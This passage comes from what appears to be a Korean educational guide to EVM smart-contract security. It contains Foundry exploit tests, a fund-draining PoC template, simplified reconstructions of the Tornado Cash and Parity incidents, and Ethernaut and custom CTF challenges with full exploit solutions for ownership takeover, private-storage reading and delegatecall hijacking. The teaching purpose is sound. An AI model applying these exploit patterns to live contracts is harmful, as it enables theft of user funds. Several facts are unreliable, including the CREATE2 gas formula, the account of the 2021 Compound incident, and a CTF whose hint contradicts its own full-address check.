        // 공격 성공 assert
        assertGt(
            address(attacker).balance,
            1 ether,
            "Attacker should have profited"
        );
    }

    // 방어 코드 테스트
    function testDefenseWorks() public {
        SecureContract secure = new SecureContract();
        vm.deal(victim, 5 ether);

        vm.prank(victim);
        secure.deposit{value: 5 ether}();

        // 공격이 revert됨을 확인
        vm.expectRevert();
        vm.prank(attacker);
        secure.attackEntry();
    }

    // 퍼즈 테스트: 임의 입력에 대한 불변성 확인
    function testFuzz_deposit(uint96 amount) public {
        vm.assume(amount > 0);
        vm.deal(address(this), amount);

        uint256 balanceBefore = address(target).balance;
        target.deposit{value: amount}();

        assertEq(
            address(target).balance,
            balanceBefore + amount,
            "Balance should increase by deposit amount"
        );
    }
}
```

#### 스토리지 슬롯 검사

```bash
# 특정 컨트랙트의 스토리지 슬롯 읽기
cast storage <address> <slot> --rpc-url http://localhost:8545

# Foundry 테스트에서 vm.load 사용
# bytes32 value = vm.load(contractAddress, slot);

# 스토리지 덤프 (전체)
cast storage --rpc-url <RPC> <address>
```

---

### 3.3 최소 재현 코드(PoC) 작성 방법

효과적인 PoC 작성은 취약점 보고와 수정에서 핵심이다.

#### PoC 작성 원칙

```
1. 최소성(Minimality): 취약점 재현에 필요한 최소한의 코드만 포함
2. 독립성(Self-contained): 외부 의존성 없이 단독 실행 가능
3. 결정론성(Determinism): 항상 동일한 결과 재현 가능
4. 가시성(Visibility): 공격 전/후 상태 명확히 출력
5. 검증(Verification): 공격 성공 여부를 단언(assert)으로 확인
```

#### PoC 템플릿

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ============================================================
// PoC: [취약점 이름]
// 작성일: 2024-XX-XX
// 영향: [피해 범위]
// 루트 원인: [원인 요약]
// ============================================================

import "forge-std/Test.sol";

// 1. 취약한 컨트랙트 (최소화된 버전)
contract VulnerableTarget {
    // 취약점의 핵심 로직만 포함
    // 실제 컨트랙트에서 관련 없는 코드는 제거
}

// 2. 공격 컨트랙트 (필요한 경우)
contract Attacker {
    VulnerableTarget target;

    constructor(address _target) {
        target = VulnerableTarget(_target);
    }

    function attack() external payable {
        // 공격 로직
    }
}

// 3. 테스트
contract PoCTest is Test {
    VulnerableTarget target;
    address attacker = address(0xA77AC1);
    address victim = address(0xB1C71);

    function setUp() public {
        // 최소한의 초기 상태만 설정
        target = new VulnerableTarget();
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        // victim 초기 설정
    }

    function testPoC() public {
        // 공격 전 상태 기록
        uint256 before = address(target).balance;
        emit log_named_uint("Contract balance before", before);

        // 공격 실행
        vm.startPrank(attacker);
        vm.deal(attacker, 1 ether);
        Attacker atk = new Attacker(address(target));
        atk.attack{value: 1 ether}();
        vm.stopPrank();

        // 공격 후 상태
        uint256 after = address(target).balance;
        emit log_named_uint("Contract balance after", after);

        // 성공 검증
        assertLt(after, before, "Funds were drained");
        assertGt(
            address(attacker).balance,
            1 ether,
            "Attacker profited"
        );
    }
}
```

#### 가스 측정 포함 PoC

```solidity
// 가스 비용 분석이 필요한 경우
function testPoCWithGasAnalysis() public {
    uint256 gasBefore = gasleft();

    // 공격 실행
    target.vulnerableFunction();

    uint256 gasUsed = gasBefore - gasleft();
    emit log_named_uint("Gas used for attack", gasUsed);

    // 가스 비용이 합리적인지 확인 (DoS 공격 분석)
    assertLt(gasUsed, 100_000, "Attack is too expensive to be practical");
}
```

---

## 4. 관련 사고 사례

### 4.1 Tornado Cash: CREATE2 + 메타모픽 거버넌스 제안

**발생 시점**: 2023년 5월
**손실**: 거버넌스 탈취 (금전 피해 없음, 프로토콜 통제권 탈취)

**공격 개요**:

```
공격 흐름:
1. 공격자가 악의적인 거버넌스 제안(proposal #20) 제출
2. 제안에는 정상적으로 보이는 로직 컨트랙트 포함 (감사 통과)
3. 커뮤니티 투표로 제안 통과
4. 공격자가 제안 실행 트랜잭션에서 컨트랙트 바이트코드를 교체
   - SELFDESTRUCT로 원래 로직 소멸
   - CREATE2로 같은 주소에 악성 로직 재배포
5. 악성 로직이 실행되어 거버넌스 투표 토큰 탈취
6. 공격자가 과반수 투표권 획득 → 프로토콜 통제권 장악
```

**기술적 세부사항**:

```solidity
// 공격자가 제출한 제안의 단순화 버전
// (실제는 더 복잡하지만 핵심 메커니즘 설명)

contract TornadoProposal {
    // 1단계에서 배포된 "정상" 로직
    function executeProposal() external {
        // 표면상 무해한 코드
        // 감사에서 발견되지 않음
    }

    // 히든 함수: 나중에 이 컨트랙트를 소멸하고 재배포할 Factory를 가리킴
    function selfDestructAndReploy() external {
        selfdestruct(payable(factory));
    }
}

// 악성 로직 (재배포된 버전)
contract MaliciousProposal {
    address attacker = 0x...;

    function executeProposal() external {
        // 거버넌스 토큰 전량을 attacker에게 이전
        TORN.transfer(attacker, TORN.balanceOf(address(governance)));
    }
}
```

**교훈**:
- 거버넌스 제안의 구현 컨트랙트를 `codehash`로 고정해야 함
- 실행 시점에 컨트랙트 코드가 바뀌었는지 확인해야 함
- EIP-6780 이후에는 이 공격 불가능 (Dencun 이후)

---

### 4.2 Parity Wallet: delegatecall + selfdestruct

**발생 시점**: 2017년 11월
**손실**: 514,000 ETH (당시 약 $3억) 영구 동결

**공격 개요**:

```
사건 경위:
1. Parity 멀티시그 지갑 v2는 프록시 패턴 사용
   - WalletProxy: 각 지갑 인스턴스
   - WalletLibrary: 공유 로직 컨트랙트
   - WalletProxy → delegatecall → WalletLibrary

2. WalletLibrary에 initWallet() 함수가 접근 제어 없이 public
   - 생성자가 아닌 일반 함수 → 재호출 가능

3. "devops199"라는 사용자가 WalletLibrary.initWallet() 직접 호출
   - WalletLibrary 자체의 소유자 설정 가능 (Library에도 initWallet 실행)

4. WalletLibrary의 kill() 함수 호출 → SELFDESTRUCT
   - WalletLibrary 소멸
   - 모든 WalletProxy가 delegatecall하는 코드가 사라짐
   - 모든 지갑 영구 동결
```

```solidity
// 취약한 WalletLibrary의 단순화 버전
contract VulnerableWalletLibrary {
    address public owner;
    bool public initialized;

    // 취약: 접근 제어 없는 초기화 함수
    function initWallet(address[] memory _owners) public {
        // initialized 체크 없음!
        owner = _owners[0];
        initialized = true;
    }

    // 취약: owner만 호출 가능해야 하지만, 위를 통해 owner 탈취 가능
    function kill(address payable to) external {
        require(msg.sender == owner, "Not owner");
        selfdestruct(to);
    }
}

// 공격 시나리오:
// 1. library.initWallet([attacker]) → library.owner = attacker
// 2. library.kill(attacker) → SELFDESTRUCT
// 3. 모든 프록시의 코드베이스 소멸 → 지갑 동결
```

**교훈**:
- 라이브러리 컨트랙트에도 반드시 접근 제어 적용
- 초기화 함수는 `initializer` modifier로 단 한 번만 실행 가능하게 제한
- OpenZeppelin의 `Initializable` 패턴 사용 권장

---

### 4.3 Various low-level call failures

**케이스 1: Compound Finance 가격 오라클 버그 (2021년)**

```
문제: COMP 토큰 분배 계산에서 잘못된 정수 나눗셈
- comptroller.claimComp() 내부의 나눗셈 오류
- 일부 시장에서 0으로 나누는 상황 발생
- 결과: 일부 사용자에게 과도한 COMP 분배 ($80M 이상)
```

**케이스 2: dYdX Solo Margin (2019년)**

```
문제: 존재하지 않는 계약에 대한 call이 success=true 반환
- ERC20 토큰 인터페이스의 transfer()를 외부 주소에 호출
- 해당 주소에 코드가 없었지만 success=true
- 잔고 업데이트 없이 "전송 성공"으로 처리
```

**케이스 3: Akutars NFT (2022년)**

```
문제: 잘못된 low-level call 처리
- 환불 로직에서 실패한 call의 반환값 무시
- 34 ETH 영구 동결
- 코드: (bool success,) = addr.call{value: amount}("");
  // success 확인 없음!
```

---

## 5. CTF 연습 문제

### 문제 1: Ethernaut - Telephone (레벨 4)

**목표**: `tx.origin != msg.sender`를 이용해 소유권 탈취

```solidity
// Telephone 컨트랙트
contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

// 풀이 힌트: 중간 컨트랙트를 통해 호출하면?
// EOA → IntermediaryContract → Telephone.changeOwner()
// tx.origin = EOA, msg.sender = IntermediaryContract → 조건 충족
```

**풀이 코드**:

```solidity
contract TelephoneSolver {
    function solve(address telephone) external {
        Telephone(telephone).changeOwner(tx.origin);
        // tx.origin = 내 EOA, msg.sender = TelephoneSolver
        // tx.origin != msg.sender → 조건 충족 → owner 변경
    }
}
```

---

### 문제 2: Ethernaut - Privacy (레벨 12)

**목표**: private 스토리지 변수 읽기

```solidity
contract Privacy {
    bool public locked = true;     // slot 0
    uint256 public ID = block.timestamp; // slot 1
    uint8 private flattening = 10; // slot 2 (패킹)
    uint8 private denomination = 255; // slot 2 (패킹)
    uint16 private awkwardness = uint16(block.timestamp); // slot 2 (패킹)
    bytes32[3] private data;       // slot 3, 4, 5

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));  // data[2]의 상위 16바이트
        locked = false;
    }
}

// 풀이:
// 1. data[2]의 스토리지 슬롯 계산: slot 5 (slot 3 + 2)
// 2. cast storage <address> 5 로 읽기
// 3. 읽은 값의 상위 16바이트를 bytes16으로 캐스팅
// 4. unlock(key) 호출
```

**풀이 스크립트 (Foundry)**:

```solidity
contract PrivacySolver is Test {
    function solve(address target) external {
        // slot 5 = data[2]
        bytes32 data2 = vm.load(target, bytes32(uint256(5)));
        bytes16 key = bytes16(data2);  // 상위 16바이트
        Privacy(target).unlock(key);
        assertFalse(Privacy(target).locked());
    }
}
```

---

### 문제 3: Ethernaut - Delegation (레벨 6)

**목표**: delegatecall을 이용해 Delegation 컨트랙트의 owner 탈취

```solidity
contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;  // slot 0에 msg.sender 씀
    }
}

contract Delegation {
    address public owner;        // slot 0
    Delegate delegate;           // slot 1

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        // delegatecall: Delegate의 코드가 Delegation의 컨텍스트에서 실행
        // pwn()이 실행되면 Delegation.slot[0] (owner)를 msg.sender로 설정
    }
}

// 풀이:
// Delegation에 pwn() 함수 시그니처를 calldata로 보내면
// fallback이 트리거 → delegatecall(pwn()) → owner가 나로 변경
```

**풀이**:

```javascript
// web3.js / ethers.js
const pwn = web3.utils.keccak256("pwn()").slice(0, 10);
await web3.eth.sendTransaction({
    from: player,
    to: instance,
    data: pwn
});
```

---

### 문제 4: 커스텀 CTF - Transient Storage 버그

**목표**: Transient Storage의 동일 트랜잭션 내 지속성을 이용해 승인 우회

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// 목표: flashLoan을 통해 restrictedAction()을 호출하여 flag 획득
contract TransientStorageCTF {
    bytes32 private constant FLASH_APPROVED = keccak256("flash.approved");
    bool public flagCaptured;

    function flashLoan(uint256 amount, bytes calldata callbackData) external {
        assembly {
            tstore(FLASH_APPROVED, 1)
        }

        // 콜백 실행
        (bool success,) = msg.sender.call(callbackData);
        require(success, "Callback failed");

        // 상환 확인 (생략)

        assembly {
            tstore(FLASH_APPROVED, 0)
        }
    }

    function restrictedAction() external {
        uint256 approved;
        assembly {
            approved := tload(FLASH_APPROVED)
        }
        require(approved == 1, "Must be called during flash loan");
        flagCaptured = true;
    }
}

// 풀이 힌트:
// flashLoan을 호출하는 컨트랙트를 작성하고
// callbackData에 restrictedAction() 호출을 포함시키면?
```

**풀이**:

```solidity
contract TransientCTFSolver {
    TransientStorageCTF target;

    constructor(address _target) {
        target = TransientStorageCTF(_target);
    }

    function solve() external {
        // flashLoan의 콜백에서 restrictedAction 호출
        target.flashLoan(
            0,
            abi.encodeWithSignature("callRestrictedAction()")
        );
    }

    function callRestrictedAction() external {
        // 이 시점에서 FLASH_APPROVED == 1 (flashLoan 내부)
        target.restrictedAction();
    }
}
```

---

### 문제 5: 커스텀 CTF - CREATE2 주소 충돌

**목표**: CREATE2로 특정 주소에 컨트랙트를 배포하여 잠긴 금고 열기

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// 목표: 특정 주소(0x1234...XXXX)에 컨트랙트를 배포하여 금고 해제
contract CREATE2CTF {
    address public constant MAGIC_ADDRESS =
        0x000000000000000000000000000000000000dEaD;  // 예시

    bool public vaultUnlocked;

    function unlockVault(address deployer, bytes32 salt, bytes calldata initCode) external {
        // CREATE2 주소 계산
        address predicted = address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xff),
            deployer,
            salt,
            keccak256(initCode)
        )))));

        // 예측 주소가 MAGIC_ADDRESS와 일치하면 금고 해제
        require(predicted == MAGIC_ADDRESS, "Wrong address");

        // 실제로 해당 주소에 코드가 있는지 확인
        require(predicted.code.length > 0, "Contract not deployed");

        vaultUnlocked = true;
    }
}

// 풀이 힌트:
// salt를 brute force하여 MAGIC_ADDRESS와 일치하는 salt 찾기
// Python 스크립트로 vanity address mining:
// for salt in range(2**256):
//     addr = compute_create2_address(deployer, salt, init_code_hash)
//     if addr.startswith("0x000000"):
//         print(f"Found: salt={salt}, addr={addr}")
//         break
```

---

## 6. 참고 자료

### 공식 문서

| 자료 | 링크 | 설명 |
|------|------|------|
| Ethereum Yellow Paper | ethereum.github.io/yellowpaper | EVM 공식 명세 |
| evm.codes | evm.codes | Opcode 참조 및 Playground |
| Solidity 공식 문서 | docs.soliditylang.org | 언어 레퍼런스 |
| EIP 저장소 | eips.ethereum.org | 이더리움 개선 제안 |

### 관련 EIP

| EIP | 제목 | 중요도 |
|-----|------|--------|
| EIP-1967 | Standard Proxy Storage Slots | 높음 |
| EIP-7201 | Namespaced Storage Layout | 높음 |
| EIP-1153 | Transient Storage Opcodes | 높음 |
| EIP-6780 | SELFDESTRUCT restriction | 높음 |
| EIP-3855 | PUSH0 instruction | 중간 |
| EIP-4337 | Account Abstraction | 중간 |
| EIP-4844 | Proto-Danksharding | 낮음 |

### 보안 도구

| 도구 | 용도 |
|------|------|
| Foundry (forge, cast, anvil) | 개발/테스트/디버깅 |
| Slither | 정적 분석 |
| Mythril | 심볼릭 실행 기반 취약점 탐지 |
| Echidna | 퍼즈 테스팅 |
| Manticore | 심볼릭 실행 |
| Tenderly | 트랜잭션 시뮬레이션/디버깅 |
| Etherscan Debugger | 온체인 트랜잭션 분석 |

### 학습 자료 (추천 순서)

1. **기초**: evm.codes에서 모든 opcode 직접 실행해보기
2. **실습**: Ethernaut 전체 레벨 풀기 (https://ethernaut.openzeppelin.com)
3. **심화**: Damn Vulnerable DeFi 풀기 (https://www.damnvulnerabledefi.xyz)
4. **사례 연구**: RektNews 아카이브 읽기 (https://rekt.news)
5. **레퍼런스**: "Ethereum EVM Illustrated" by Takenobu T.
6. **고급**: Trail of Bits 보안 블로그 (https://blog.trailofbits.com)
7. **CTF**: OpenCTF, EthCTF 참가

### 사고 사례 데이터베이스

| 사고 | 날짜 | 피해액 | 주요 취약점 |
|------|------|--------|-------------|
| Tornado Cash 거버넌스 | 2023-05 | 거버넌스 탈취 | CREATE2 + metamorphic |
| Parity Wallet Freeze | 2017-11 | $3억 동결 | delegatecall + selfdestruct |
| DAO Hack | 2016-06 | $60M | 재진입 공격 |
| Compound COMP 과다 분배 | 2021-09 | $80M+ | 산술 오류 |
| Akutars NFT | 2022-04 | 34 ETH 동결 | call 반환값 무시 |
| Nomad Bridge | 2022-08 | $190M | 초기화 오류 |

---

## 부록: 핵심 공식 정리

### 스토리지 슬롯 계산 공식

```
고정 크기 변수:    선언 순서대로 순차 배치
동적 배열 arr:     arr[i] → keccak256(slot) + i
매핑 map:          map[key] → keccak256(key ++ slot)
중첩 매핑:         map[k1][k2] → keccak256(k2 ++ keccak256(k1 ++ slot))

EIP-1967 implementation:
keccak256("eip1967.proxy.implementation") - 1
= 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc

EIP-7201 namespace:
keccak256(abi.encode(uint256(keccak256(id)) - 1)) & ~bytes32(uint256(0xff))
```

### CREATE/CREATE2 주소 공식

```
CREATE:
address = keccak256(RLP(sender, nonce))[12:]

CREATE2:
address = keccak256(0xff ++ sender ++ salt ++ keccak256(initCode))[12:]
```

### 가스 비용 주요 항목

```
SLOAD  (cold):   2,100 gas
SLOAD  (warm):   100 gas
SSTORE (0→nonzero): ~20,000 gas
SSTORE (nonzero→nonzero): 2,900 gas
TLOAD:           100 gas
TSTORE:          100 gas
CALL:            700 gas (기본) + 전달 가스
CREATE:          32,000 gas (기본)
CREATE2:         32,000 gas (기본) + 200 * initCode.length / 32
```

---

*이 자료는 교육 목적으로 작성되었습니다. 모든 PoC 코드는 통제된 테스트 환경에서만 사용하십시오. 실제 컨트랙트에 대한 무단 공격은 불법입니다.*

*다음 단계: Phase 2 - DeFi 프로토콜 취약점 심화*
